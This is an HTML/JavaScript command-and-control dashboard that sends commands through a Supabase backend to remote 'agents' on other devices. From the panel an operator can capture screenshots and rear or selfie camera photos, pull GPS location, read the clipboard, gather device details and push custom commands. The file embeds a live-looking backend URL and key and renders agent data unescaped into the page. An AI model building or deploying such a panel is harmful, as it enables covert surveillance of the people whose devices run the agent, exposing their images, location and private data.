<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CMD Dashboard</title>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');

  :root {
    --green: #00ff88;
    --green-dim: #00ff8844;
    --green-glow: #00ff8818;
    --dark: #020c05;
    --mid: #041a09;
    --panel: #030f06;
    --border: #00ff8833;
    --accent: #00ccff;
    --accent-dim: #00ccff33;
    --warn: #ffaa00;
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body { height: 100%; overflow: hidden; }

  body {
    background: var(--dark);
    color: var(--green);
    font-family: 'Share Tech Mono', monospace;
    display: grid;
    grid-template-rows: 60px 1fr;
    grid-template-columns: 260px 1fr 340px;
    height: 100vh;
    position: relative;
  }

  /* Scanlines */
  body::before {
    content: '';
    position: fixed; inset: 0;
    background: repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,0,0,0.08) 3px, rgba(0,0,0,0.08) 4px);
    pointer-events: none;
    z-index: 9999;
  }

  /* ── HEADER ── */
  header {
    grid-column: 1 / -1;
    grid-row: 1;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 1.5rem;
    border-bottom: 1px solid var(--border);
    background: var(--panel);
    position: relative;
    z-index: 100;
  }

  .logo-wrap { display: flex; align-items: center; gap: 1rem; }
  .logo-text { font-family: 'Orbitron', monospace; font-size: 1.4rem; font-weight: 900; letter-spacing: 0.3em; text-shadow: 0 0 20px var(--green); }
  .logo-sub { font-size: 0.6rem; letter-spacing: 0.5em; color: #00ff8855; }

  .header-stats { display: flex; gap: 2rem; }
  .hstat { text-align: center; }
  .hstat-val { font-size: 1.1rem; color: var(--green); font-weight: bold; text-shadow: 0 0 10px var(--green); }
  .hstat-label { font-size: 0.55rem; letter-spacing: 0.3em; color: #00ff8855; }

  .live-badge {
    display: flex; align-items: center; gap: 0.4rem;
    font-size: 0.65rem; letter-spacing: 0.3em; color: var(--green);
  }
  .live-dot { width:8px; height:8px; border-radius:50%; background:var(--green); box-shadow:0 0 8px var(--green); animation: blink 1s infinite; }

  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }

  /* ── LEFT PANEL: Agents ── */
  .panel-left {
    grid-column: 1;
    grid-row: 2;
    border-right: 1px solid var(--border);
    background: var(--panel);
    display: flex;
    flex-direction: column;
    overflow: hidden;
  }

  .panel-title {
    padding: 0.8rem 1rem;
    font-size: 0.6rem;
    letter-spacing: 0.4em;
    color: #00ff8866;
    border-bottom: 1px solid var(--border);
    display: flex;
    justify-content: space-between;
    align-items: center;
  }

  .agents-list { flex: 1; overflow-y: auto; padding: 0.5rem; }

  .agent-card {
    padding: 0.8rem;
    border: 1px solid var(--border);
    border-radius: 3px;
    margin-bottom: 0.5rem;
    cursor: pointer;
    transition: all 0.15s;
    background: var(--dark);
    position: relative;
  }
  .agent-card:hover { border-color: var(--green); background: var(--mid); }
  .agent-card.selected { border-color: var(--green); background: var(--mid); box-shadow: 0 0 15px var(--green-glow); }
  .agent-card.offline { opacity: 0.5; }

  .agent-name { font-size: 0.75rem; margin-bottom: 0.3rem; display: flex; align-items: center; gap: 0.4rem; }
  .agent-ua { font-size: 0.58rem; color: #00ff8844; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
  .agent-time { font-size: 0.55rem; color: #00ff8833; margin-top: 0.3rem; }

  .dot-sm { width: 6px; height: 6px; border-radius: 50%; display: inline-block; flex-shrink: 0; }
  .dot-online { background: var(--green); box-shadow: 0 0 6px var(--green); animation: blink 1.5s infinite; }
  .dot-offline { background: #ff4444; }

  .no-agents { padding: 2rem 1rem; text-align: center; font-size: 0.7rem; color: #00ff8833; line-height: 2; }

  /* ── CENTER: Commands ── */
  .panel-center {
    grid-column: 2;
    grid-row: 2;
    display: flex;
    flex-direction: column;
    overflow: hidden;
    border-right: 1px solid var(--border);
  }

  .cmd-grid {
    padding: 1rem;
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 0.6rem;
    border-bottom: 1px solid var(--border);
  }

  .cmd-btn {
    padding: 0.9rem 0.5rem;
    background: var(--dark);
    border: 1px solid var(--border);
    color: var(--green);
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.7rem;
    letter-spacing: 0.1em;
    cursor: pointer;
    border-radius: 3px;
    transition: all 0.15s;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 0.4rem;
    text-align: center;
  }
  .cmd-btn:hover:not(:disabled) { background: var(--mid); border-color: var(--green); box-shadow: 0 0 15px var(--green-glow); transform: translateY(-1px); }
  .cmd-btn:active:not(:disabled) { transform: translateY(0); }
  .cmd-btn:disabled { opacity: 0.3; cursor: not-allowed; }
  .cmd-btn .icon { font-size: 1.3rem; }
  .cmd-btn .name { font-size: 0.65rem; }
  .cmd-btn.danger { border-color: #ff444433; color: #ff8888; }
  .cmd-btn.danger:hover:not(:disabled) { border-color: #ff4444; box-shadow: 0 0 15px #ff444422; }
  .cmd-btn.accent { border-color: #00ccff33; color: var(--accent); }
  .cmd-btn.accent:hover:not(:disabled) { border-color: var(--accent); box-shadow: 0 0 15px var(--accent-dim); }

  /* Custom command */
  .custom-cmd {
    padding: 0.8rem 1rem;
    border-bottom: 1px solid var(--border);
    display: flex;
    gap: 0.5rem;
    align-items: center;
  }
  .custom-cmd input {
    flex: 1;
    background: var(--dark);
    border: 1px solid var(--border);
    color: var(--green);
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.8rem;
    padding: 0.5rem 0.8rem;
    border-radius: 3px;
    outline: none;
  }
  .custom-cmd input:focus { border-color: var(--green); }
  .custom-cmd input::placeholder { color: #00ff8833; }
  .send-btn {
    padding: 0.5rem 1rem;
    background: var(--green-dim);
    border: 1px solid var(--green);
    color: var(--green);
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.75rem;
    letter-spacing: 0.2em;
    cursor: pointer;
    border-radius: 3px;
    transition: all 0.15s;
  }
  .send-btn:hover { background: #00ff8866; box-shadow: 0 0 20px var(--green-dim); }

  .target-bar {
    padding: 0.5rem 1rem;
    border-bottom: 1px solid var(--border);
    display: flex;
    align-items: center;
    gap: 0.8rem;
    font-size: 0.65rem;
    color: #00ff8866;
  }
  .target-bar select {
    background: var(--dark);
    border: 1px solid var(--border);
    color: var(--green);
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.7rem;
    padding: 0.2rem 0.5rem;
    border-radius: 2px;
    outline: none;
    flex: 1;
  }

  /* Result viewer */
  .result-viewer {
    flex: 1;
    overflow-y: auto;
    padding: 1rem;
  }

  .result-card {
    border: 1px solid var(--border);
    border-radius: 3px;
    margin-bottom: 0.8rem;
    background: var(--dark);
    overflow: hidden;
    animation: slideIn 0.3s ease;
  }
  @keyframes slideIn { from { opacity:0; transform: translateY(8px); } to { opacity:1; transform:none; } }

  .result-header {
    padding: 0.5rem 0.8rem;
    background: var(--mid);
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 0.65rem;
    border-bottom: 1px solid var(--border);
  }
  .result-header .cmd-tag { color: var(--green); letter-spacing: 0.2em; }
  .result-header .agent-tag { color: #00ff8866; }
  .result-header .time-tag { color: #00ff8844; }
  .result-header .ok { color: #00ff88; }
  .result-header .fail { color: #ff6666; }

  .result-body { padding: 0.8rem; font-size: 0.72rem; }
  .result-body pre { white-space: pre-wrap; word-break: break-all; color: #00ff88bb; line-height: 1.6; }
  .result-body img { max-width: 100%; border-radius: 3px; border: 1px solid var(--border); margin-top: 0.5rem; cursor: pointer; }
  .result-body .map-link { color: var(--accent); text-decoration: none; font-size: 0.7rem; }
  .result-body .map-link:hover { text-decoration: underline; }
  .kv { display: grid; grid-template-columns: auto 1fr; gap: 0.2rem 1rem; }
  .kv .k { color: #00ff8866; }
  .kv .v { color: var(--green); }

  .empty-results { padding: 3rem; text-align: center; color: #00ff8833; font-size: 0.75rem; line-height: 2.5; }

  /* ── RIGHT PANEL: Log ── */
  .panel-right {
    grid-column: 3;
    grid-row: 2;
    background: var(--panel);
    display: flex;
    flex-direction: column;
    overflow: hidden;
  }

  .log-stream {
    flex: 1;
    overflow-y: auto;
    padding: 0.5rem;
  }

  .log-item {
    padding: 0.4rem 0.6rem;
    font-size: 0.67rem;
    border-left: 2px solid transparent;
    margin-bottom: 2px;
    border-radius: 0 2px 2px 0;
    animation: fadeIn 0.2s ease;
    line-height: 1.5;
  }
  @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
  .log-item.info { border-color: #00ff8833; color: #00ff8877; }
  .log-item.success { border-color: var(--green); color: var(--green); }
  .log-item.error { border-color: #ff4444; color: #ff8888; }
  .log-item.cmd { border-color: var(--accent); color: var(--accent); }
  .log-item .lt { color: #00ff8833; margin-right: 0.4rem; }

  /* Scrollbars */
  ::-webkit-scrollbar { width: 3px; }
  ::-webkit-scrollbar-track { background: transparent; }
  ::-webkit-scrollbar-thumb { background: var(--border); }

  /* Image modal */
  .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9000; align-items: center; justify-content: center; }
  .modal.open { display: flex; }
  .modal img { max-width: 90%; max-height: 90vh; border: 1px solid var(--green); border-radius: 4px; }
  .modal-close { position: fixed; top: 1rem; right: 1.5rem; font-size: 2rem; cursor: pointer; color: var(--green); z-index: 9001; }

  /* Alert params input */
  #alertParams { display: none; }
  .params-row {
    padding: 0.4rem 1rem;
    display: flex;
    gap: 0.5rem;
    align-items: center;
    border-bottom: 1px solid var(--border);
    font-size: 0.65rem;
    color: #00ff8866;
  }
  .params-row input {
    flex: 1;
    background: var(--dark);
    border: 1px solid var(--border);
    color: var(--green);
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.72rem;
    padding: 0.3rem 0.6rem;
    border-radius: 2px;
    outline: none;
  }
  .params-row input:focus { border-color: var(--green); }
</style>
</head>
<body>

<!-- Header -->
<header>
  <div class="logo-wrap">
    <div>
      <div class="logo-text">CMD</div>
      <div class="logo-sub">REMOTE CONTROL DASHBOARD</div>
    </div>
  </div>
  <div class="header-stats">
    <div class="hstat">
      <div class="hstat-val" id="statAgents">0</div>
      <div class="hstat-label">AGENTS ONLINE</div>
    </div>
    <div class="hstat">
      <div class="hstat-val" id="statCmds">0</div>
      <div class="hstat-label">COMMANDS SENT</div>
    </div>
    <div class="hstat">
      <div class="hstat-val" id="statResults">0</div>
      <div class="hstat-label">RESULTS</div>
    </div>
  </div>
  <div class="live-badge">
    <div class="live-dot"></div>
    LIVE
  </div>
</header>

<!-- Left: Agents -->
<div class="panel-left">
  <div class="panel-title">
    <span>CONNECTED AGENTS</span>
    <span id="agentCount">0</span>
  </div>
  <div class="agents-list" id="agentsList">
    <div class="no-agents">No agents online.<br>Open agent.html on<br>another device.</div>
  </div>
</div>

<!-- Center: Commands + Results -->
<div class="panel-center">
  <div class="target-bar">
    <span>TARGET:</span>
    <select id="targetSelect">
      <option value="ALL">📡 ALL DEVICES</option>
    </select>
  </div>

  <div class="cmd-grid">
    <button class="cmd-btn" onclick="sendCmd('screenshot')">
      <span class="icon">📸</span>
      <span class="name">SCREENSHOT</span>
    </button>
    <button class="cmd-btn" onclick="sendCmd('getinfo')">
      <span class="icon">💻</span>
      <span class="name">DEVICE INFO</span>
    </button>
    <button class="cmd-btn" onclick="sendCmd('getlocation')">
      <span class="icon">📍</span>
      <span class="name">LOCATION</span>
    </button>
    <button class="cmd-btn" onclick="sendCmd('getbattery')">
      <span class="icon">🔋</span>
      <span class="name">BATTERY</span>
    </button>
    <button class="cmd-btn" onclick="sendCmd('getnetwork')">
      <span class="icon">📶</span>
      <span class="name">NETWORK</span>
    </button>
    <button class="cmd-btn" onclick="sendCmd('getcamera')">
      <span class="icon">📷</span>
      <span class="name">REAR CAM</span>
    </button>
    <button class="cmd-btn" onclick="sendCmd('getselfie')">
      <span class="icon">🤳</span>
      <span class="name">SELFIE CAM</span>
    </button>
    <button class="cmd-btn accent" onclick="sendCmd('ping')">
      <span class="icon">🏓</span>
      <span class="name">PING</span>
    </button>
    <button class="cmd-btn accent" onclick="sendCmd('getclipboard')">
      <span class="icon">📋</span>
      <span class="name">CLIPBOARD</span>
    </button>
    <button class="cmd-btn danger" onclick="showAlertParams()">
      <span class="icon">🔔</span>
      <span class="name">ALERT</span>
    </button>
    <button class="cmd-btn danger" onclick="sendCmd('vibrate')">
      <span class="icon">📳</span>
      <span class="name">VIBRATE</span>
    </button>
    <button class="cmd-btn" onclick="clearResults()" style="grid-column:1 / -1; color:#00ff8866;">
      <span class="icon">🗑️</span>
      <span class="name">CLEAR RESULTS</span>
    </button>
  </div>

  <!-- Alert params -->
  <div class="params-row" id="alertParams">
    <span>MSG:</span>
    <input type="text" id="alertMsg" placeholder="Enter alert message..." value="Hello from CMD Dashboard!">
    <button class="send-btn" onclick="sendAlertCmd()">SEND</button>
    <button class="send-btn" onclick="hideAlertParams()" style="background:transparent;border-color:#ff444444;color:#ff8888;">✕</button>
  </div>

  <!-- Custom command -->
  <div class="custom-cmd">
    <span style="font-size:0.65rem;color:#00ff8866;letter-spacing:0.2em;white-space:nowrap;">CUSTOM:</span>
    <input type="text" id="customCmd" placeholder="Type command name..." onkeydown="if(event.key==='Enter') sendCustom()">
    <button class="send-btn" onclick="sendCustom()">⚡ SEND</button>
  </div>

  <div class="result-viewer" id="resultViewer">
    <div class="empty-results">
      ◈ No results yet ◈<br>
      Select a target agent and send a command
    </div>
  </div>
</div>

<!-- Right: Log -->
<div class="panel-right">
  <div class="panel-title">
    <span>SYSTEM LOG</span>
    <span onclick="clearLog()" style="cursor:pointer;color:#00ff8833;">CLR</span>
  </div>
  <div class="log-stream" id="logStream"></div>
</div>

<!-- Image Modal -->
<div class="modal" id="imgModal" onclick="this.classList.remove('open')">
  <span class="modal-close">✕</span>
  <img id="modalImg" src="">
</div>

<script>
const SUPABASE_URL = 'https://muyevssqiuvhcozgxtlp.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im11eWV2c3NxaXV2aGNvemd4dGxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg0MTE4NTQsImV4cCI6MjA5Mzk4Nzg1NH0.jzN6V1UArKq5epxK3tTXuo1cGukH5oKD9qAi1FQWGUU';
const { createClient } = supabase;
const sb = createClient(SUPABASE_URL, SUPABASE_KEY);

let agents = {};
let cmdCount = 0;
let resultCount = 0;

function log(msg, type='info') {
  const el = document.createElement('div');
  el.className = 'log-item ' + type;
  const t = new Date().toLocaleTimeString('en-US',{hour12:false});
  el.innerHTML = `<span class="lt">${t}</span>${msg}`;
  const s = document.getElementById('logStream');
  s.appendChild(el);
  s.scrollTop = s.scrollHeight;
  if (s.children.length > 200) s.removeChild(s.firstChild);
}

function clearLog() { document.getElementById('logStream').innerHTML = ''; }

// ── DB SETUP ──────────────────────────────────────────────

async function initTables() {
  // Try creating tables via RPC or just proceed (tables may already exist)
  // We'll handle errors gracefully
  await Promise.all([
    sb.from('agents').select('id').limit(1),
    sb.from('commands').select('id').limit(1),
    sb.from('results').select('id').limit(1)
  ]).catch(() => {});
  log('Connected to Supabase', 'success');
  loadAgents();
  subscribeToAgents();
  subscribeToResults();
  loadRecentResults();
}

// ── AGENTS ────────────────────────────────────────────────

async function loadAgents() {
  const { data, error } = await sb.from('agents').select('*').order('last_seen', { ascending: false });
  if (error) { log('Failed to load agents: ' + error.message, 'error'); return; }
  agents = {};
  (data || []).forEach(a => { agents[a.id] = a; });
  renderAgents();
}

function subscribeToAgents() {
  sb.channel('agents-watch')
    .on('postgres_changes', { event: '*', schema: 'public', table: 'agents' }, (p) => {
      const a = p.new;
      if (a) { agents[a.id] = a; renderAgents(); }
      if (p.eventType === 'DELETE' && p.old) { delete agents[p.old.id]; renderAgents(); }
    })
    .subscribe();
}

function renderAgents() {
  const list = document.getElementById('agentsList');
  const sel = document.getElementById('targetSelect');
  const arr = Object.values(agents);

  // Update header count
  const online = arr.filter(a => isOnline(a)).length;
  document.getElementById('statAgents').textContent = online;
  document.getElementById('agentCount').textContent = arr.length;

  if (arr.length === 0) {
    list.innerHTML = '<div class="no-agents">No agents online.<br>Open agent.html on<br>another device.</div>';
    sel.innerHTML = '<option value="ALL">📡 ALL DEVICES</option>';
    return;
  }

  // Update target select
  const curVal = sel.value;
  sel.innerHTML = '<option value="ALL">📡 ALL DEVICES</option>';
  arr.forEach(a => {
    const opt = document.createElement('option');
    opt.value = a.id;
    opt.textContent = (isOnline(a) ? '🟢 ' : '🔴 ') + a.id;
    sel.appendChild(opt);
  });
  if (curVal) sel.value = curVal;

  // Render cards
  list.innerHTML = '';
  arr.sort((a,b) => isOnline(b) - isOnline(a)).forEach(a => {
    const online = isOnline(a);
    const card = document.createElement('div');
    card.className = 'agent-card' + (online ? '' : ' offline');
    card.onclick = () => { document.getElementById('targetSelect').value = a.id; log(`Target set: ${a.id}`, 'cmd'); };
    card.innerHTML = `
      <div class="agent-name">
        <span class="dot-sm ${online ? 'dot-online' : 'dot-offline'}"></span>
        ${a.id}
      </div>
      <div class="agent-ua">${(a.user_agent || '').substring(0,50)}...</div>
      <div class="agent-time">LAST SEEN: ${timeAgo(a.last_seen)}</div>
    `;
    list.appendChild(card);
  });
}

function isOnline(agent) {
  if (!agent.last_seen) return false;
  return (Date.now() - new Date(agent.last_seen).getTime()) < 30000;
}

function timeAgo(iso) {
  if (!iso) return 'never';
  const s = Math.floor((Date.now() - new Date(iso).getTime()) / 1000);
  if (s < 5) return 'just now';
  if (s < 60) return s + 's ago';
  if (s < 3600) return Math.floor(s/60) + 'm ago';
  return Math.floor(s/3600) + 'h ago';
}

// Refresh agent status periodically
setInterval(() => { renderAgents(); }, 5000);

// ── COMMANDS ──────────────────────────────────────────────

async function sendCmd(command, params = null) {
  const target = document.getElementById('targetSelect').value;
  log(`Sending [${command.toUpperCase()}] → ${target}`, 'cmd');

  const { data, error } = await sb.from('commands').insert({
    command,
    target,
    params,
    sent_at: new Date().toISOString()
  }).select().single();

  if (error) {
    log(`Send failed: ${error.message}`, 'error');
    return;
  }

  cmdCount++;
  document.getElementById('statCmds').textContent = cmdCount;
  log(`Command dispatched (ID: ${data.id})`, 'success');
}

async function sendCustom() {
  const val = document.getElementById('customCmd').value.trim();
  if (!val) return;
  await sendCmd(val);
  document.getElementById('customCmd').value = '';
}

function showAlertParams() { document.getElementById('alertParams').style.display = 'flex'; }
function hideAlertParams() { document.getElementById('alertParams').style.display = 'none'; }
function sendAlertCmd() {
  const msg = document.getElementById('alertMsg').value;
  sendCmd('alert', { message: msg });
  hideAlertParams();
}

// ── RESULTS ───────────────────────────────────────────────

let lastResultId = 0;
let seenResultIds = new Set();

function subscribeToResults() {
  // Realtime channel
  sb.channel('results-watch')
    .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'results' }, (p) => {
      if (p.new && !seenResultIds.has(p.new.id)) {
        seenResultIds.add(p.new.id);
        if (p.new.id > lastResultId) lastResultId = p.new.id;
        renderResult(p.new);
      }
    })
    .subscribe((s) => {
      if (s === 'SUBSCRIBED') {
        log('Subscribed to result stream ✓', 'success');
      } else if (s === 'CHANNEL_ERROR' || s === 'CLOSED') {
        log('Result stream dropped — using poll fallback', 'error');
      }
    });

  // Poll every 2s as failsafe (catches results realtime misses)
  setInterval(pollResults, 2000);
}

async function pollResults() {
  try {
    const { data, error } = await sb
      .from('results')
      .select('*')
      .gt('id', lastResultId)
      .order('id', { ascending: true })
      .limit(20);

    if (error) { log('Poll error: ' + error.message, 'error'); return; }

    if (data && data.length > 0) {
      data.forEach(r => {
        if (!seenResultIds.has(r.id)) {
          seenResultIds.add(r.id);
          if (r.id > lastResultId) lastResultId = r.id;
          renderResult(r);
        }
      });
    }
  } catch(e) {}
}

async function loadRecentResults() {
  const { data, error } = await sb
    .from('results')
    .select('*')
    .order('id', { ascending: false })
    .limit(10);

  if (error) { log('Could not load results: ' + error.message, 'error'); return; }
  if (!data || data.length === 0) { log('No previous results found', 'info'); return; }

  data.reverse().forEach(r => {
    seenResultIds.add(r.id);
    if (r.id > lastResultId) lastResultId = r.id;
    renderResult(r);
  });
  log('Loaded ' + data.length + ' recent result(s)', 'success');
}

function renderResult(result) {
  resultCount++;
  document.getElementById('statResults').textContent = resultCount;

  const viewer = document.getElementById('resultViewer');
  // Clear empty state
  if (viewer.querySelector('.empty-results')) viewer.innerHTML = '';

  const card = document.createElement('div');
  card.className = 'result-card';

  const d = result.data || {};
  const statusClass = result.success ? 'ok' : 'fail';
  const statusText = result.success ? '✓ SUCCESS' : '✗ FAILED';

  let body = '';

  if (!result.success) {
    body = `<div style="color:#ff8888">ERROR: ${result.error || 'Unknown error'}</div>`;
  } else if (d.type === 'screenshot' || d.type === 'camera' || d.type === 'selfie') {
    const label = d.type === 'selfie' ? '🤳 SELFIE' : d.type === 'camera' ? '📷 REAR CAM' : '📸 SCREENSHOT';
    const facing = d.facing === 'user' ? 'Front Camera' : d.facing === 'environment' ? 'Rear Camera' : '';
    body = `<img src="${d.image}" onclick="openModal(this.src)" title="Click to expand">
            <div style="margin-top:0.4rem;color:#00ff8866;font-size:0.65rem">${label} · ${d.width}×${d.height}px${facing?' · '+facing:''} · Click to expand</div>`;
  } else if (d.type === 'location') {
    body = `<div class="kv">
      <span class="k">LAT</span><span class="v">${d.lat}</span>
      <span class="k">LNG</span><span class="v">${d.lng}</span>
      <span class="k">ACCURACY</span><span class="v">${d.accuracy}m</span>
    </div>
    <a href="${d.mapsUrl}" target="_blank" class="map-link">🗺️ Open in Google Maps →</a>`;
  } else if (d.type === 'battery') {
    body = `<div class="kv">
      <span class="k">LEVEL</span><span class="v">${d.level}</span>
      <span class="k">CHARGING</span><span class="v">${d.charging ? 'YES ⚡' : 'NO'}</span>
    </div>`;
  } else if (d.type === 'network') {
    // support both HTML agent fields and native agent fields
    const connType = d.effectiveType || d.connection_type || '?';
    const downlink = d.downlink !== undefined ? d.downlink + ' Mbps' : '?';
    const rtt = d.rtt !== undefined ? d.rtt + 'ms' : '?';
    body = `<div class="kv">
      <span class="k">ONLINE</span><span class="v">${d.online ? 'YES' : 'NO'}</span>
      <span class="k">TYPE</span><span class="v">${connType}</span>
      <span class="k">DOWNLINK</span><span class="v">${downlink}</span>
      <span class="k">RTT</span><span class="v">${rtt}</span>
    </div>`;
  } else if (d.type === 'info') {
    // support both HTML agent and native agent info fields
    const platform = d.platform || (d.manufacturer ? d.manufacturer + ' ' + d.model : '?');
    const screen = d.screenWidth ? d.screenWidth + '×' + d.screenHeight : '?';
    const cores = d.cores || '?';
    const memory = d.memory || '?';
    const tz = d.timezone || d.android || '?';
    body = `<div class="kv">
      <span class="k">DEVICE</span><span class="v">${platform}</span>
      <span class="k">SCREEN</span><span class="v">${screen}</span>
      <span class="k">CORES</span><span class="v">${cores}</span>
      <span class="k">MEMORY/OS</span><span class="v">${memory} · Android ${d.android||''}</span>
      <span class="k">TIMEZONE</span><span class="v">${tz}</span>
      <span class="k">BRAND</span><span class="v">${d.brand||d.language||'?'}</span>
    </div>`;
  } else if (d.type === 'clipboard') {
    body = `<pre>CLIPBOARD:\n${d.text || '(empty)'}</pre>`;
  } else if (d.type === 'alert') {
    body = `<div class="kv"><span class="k">MESSAGE</span><span class="v">${d.message}</span><span class="k">SHOWN</span><span class="v">${d.shown}</span></div>`;
  } else {
    body = `<pre>${JSON.stringify(d, null, 2)}</pre>`;
  }

  const t = new Date(result.executed_at || Date.now()).toLocaleTimeString('en-US',{hour12:false});

  card.innerHTML = `
    <div class="result-header">
      <span class="cmd-tag">${(d.type || 'result').toUpperCase()}</span>
      <span class="agent-tag">${result.agent_id || 'unknown'}</span>
      <span class="time-tag">${t}</span>
      <span class="${statusClass}">${statusText}</span>
    </div>
    <div class="result-body">${body}</div>
  `;

  viewer.insertBefore(card, viewer.firstChild);
  log(`Result received from ${result.agent_id || '?'} [${result.success ? 'OK' : 'FAIL'}]`, result.success ? 'success' : 'error');
}

function clearResults() {
  document.getElementById('resultViewer').innerHTML = '<div class="empty-results">◈ Results cleared ◈</div>';
  resultCount = 0;
  document.getElementById('statResults').textContent = 0;
}

function openModal(src) {
  document.getElementById('modalImg').src = src;
  document.getElementById('imgModal').classList.add('open');
}

// Init
initTables();
log('Dashboard initialized', 'info');
log('Connecting to Supabase...', 'info');
</script>
</body>
